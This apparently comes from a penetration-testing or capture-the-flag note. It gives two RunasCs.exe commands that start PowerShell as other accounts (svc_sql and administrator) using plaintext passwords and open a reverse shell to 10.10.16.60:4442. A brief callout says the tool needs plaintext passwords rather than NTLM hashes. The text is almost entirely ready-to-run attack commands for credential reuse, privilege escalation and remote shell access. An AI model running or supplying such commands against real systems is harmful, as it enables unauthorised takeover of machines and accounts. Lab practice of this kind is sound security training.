```powershell
.\RunasCs.exe svc_sql 'P@ssw0rd1!' powershell -l 5 -b -r 10.10.16.60:4442 # reverse_shell
```

>[!NOTE] RunasCs.exe
> RunasCs.exe needs the plain text of the password, it doesn't accept NTLM hash.

```
.\RunasCs.exe administrator 'StrongPassword1234!' powershell -l 5 -b -r 10.10.16.60:4442
```